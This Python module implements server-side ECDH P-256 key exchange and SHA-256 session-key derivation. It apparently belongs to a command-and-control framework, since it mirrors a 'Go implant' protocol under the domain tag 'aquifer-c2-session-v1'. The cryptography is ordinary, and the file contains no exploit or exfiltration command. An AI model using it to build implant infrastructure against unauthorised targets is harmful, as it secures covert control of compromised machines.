"""ECDH P-256 key exchange matching the Go implant's PerformKeyExchange protocol."""

from __future__ import annotations

import hashlib
import os
from pathlib import Path

from cryptography.hazmat.primitives.asymmetric.ec import (
    ECDH,
    EllipticCurvePrivateKey,
    EllipticCurvePublicKey,
    SECP256R1,
    generate_private_key,
)
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    NoEncryption,
    PrivateFormat,
    PublicFormat,
    load_pem_private_key,
)

# Domain separator -- must be byte-identical to protocol.go:74
_DOMAIN_SEPARATOR = b"aquifer-c2-session-v1"


class ECDHKeyExchange:
    """Server-side ECDH P-256 key exchange.

    The session key derivation mirrors the Go implant exactly:

        SHA-256(domain_separator || client_pub_bytes || server_pub_bytes || shared_secret)

    where client_pub_bytes and server_pub_bytes are uncompressed SEC1 points
    (0x04 || X || Y, 65 bytes each).
    """

    def __init__(self) -> None:
        self._private_key = generate_private_key(SECP256R1())

    def get_public_key_bytes(self) -> bytes:
        """Return the server's public key as an uncompressed SEC1 point (65 bytes)."""
        return self._private_key.public_key().public_bytes(
            Encoding.X962,
            PublicFormat.UncompressedPoint,
        )

    def derive_session_key(self, client_pub_bytes: bytes) -> bytes:
        """Derive a 32-byte session key from the client's public key bytes.

        Args:
            client_pub_bytes: Uncompressed SEC1 point from the client (65 bytes).

        Returns:
            32-byte session key.

        Raises:
            ValueError: If client_pub_bytes cannot be parsed as a P-256 public key.
        """
        if len(client_pub_bytes) != 65:
            raise ValueError(f"client public key must be 65 bytes, got {len(client_pub_bytes)}")

        try:
            client_pub: EllipticCurvePublicKey = (
                EllipticCurvePublicKey.from_encoded_point(SECP256R1(), client_pub_bytes)
            )
        except (ValueError, TypeError) as exc:
            raise ValueError(f"invalid client public key: {exc}") from exc

        shared_secret: bytes = self._private_key.exchange(ECDH(), client_pub)

        server_pub_bytes = self.get_public_key_bytes()

        # Matches Go protocol.go lines 73-79:
        # h.Write([]byte("aquifer-c2-session-v1"))
        # h.Write(clientPub.Bytes())   <- client's public key first
        # h.Write(serverPubKey)        <- server's public key second
        # h.Write(shared)
        h = hashlib.sha256()
        h.update(_DOMAIN_SEPARATOR)
        h.update(client_pub_bytes)
        h.update(server_pub_bytes)
        h.update(shared_secret)
        del shared_secret  # drop reference; best-effort for immutable bytes
        return h.digest()

    def save_keypair(self, path: str | Path) -> None:
        """Serialize the private key to a PEM file.

        The public key can be recovered from the private key; only the private
        key is persisted.

        Args:
            path: Filesystem path for the PEM file.
        """
        pem = self._private_key.private_bytes(
            Encoding.PEM,
            PrivateFormat.PKCS8,
            NoEncryption(),
        )
        fd = os.open(str(path), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            os.write(fd, pem)
        finally:
            os.close(fd)

    def load_keypair(self, path: str | Path) -> None:
        """Load a previously saved private key from a PEM file.

        Args:
            path: Filesystem path to the PEM file written by save_keypair.

        Raises:
            ValueError: If the file does not contain a valid EC private key.
        """
        pem = Path(path).read_bytes()
        key = load_pem_private_key(pem, password=None)
        if not isinstance(key, EllipticCurvePrivateKey) or not isinstance(key.curve, SECP256R1):
            raise ValueError("loaded key is not a SECP256R1 EC private key")
        self._private_key = key
